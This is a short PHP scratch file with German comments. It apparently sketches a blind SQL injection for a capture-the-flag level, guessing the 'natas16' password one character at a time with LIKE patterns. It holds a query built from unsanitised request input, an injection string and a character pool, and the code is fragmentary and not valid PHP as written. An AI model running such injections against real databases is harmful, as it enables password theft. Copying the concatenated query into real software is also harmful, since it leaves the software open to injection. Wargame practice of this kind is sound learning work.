<?php

#Exploit um jedes Zeichen des Passwortes zu erfühlen
# ist erstes Zeichen des Passwortes 'a'? Wenn ja nächstes Zeichen erfühlen
#  Zwischendurch schauen ob es korrekt ist?
#  Mit curl die Anfragen machen für automatisierung
#
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
# Das geht so nicht. Zwei WHERE operator brauchen auch zwei selects
$query = "SELECT * from users where username=\""natas16\" and WHERE password LIKE \"a%\" "\"";
# Das klappt vermutlich
natas16\" and password LIKE \"a%
-H "Content-type: application/x-www-form-urlencoded"
# Für einffache ascii form eingaben wie SQL querys

# Pool aus möglichen characters
$pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";


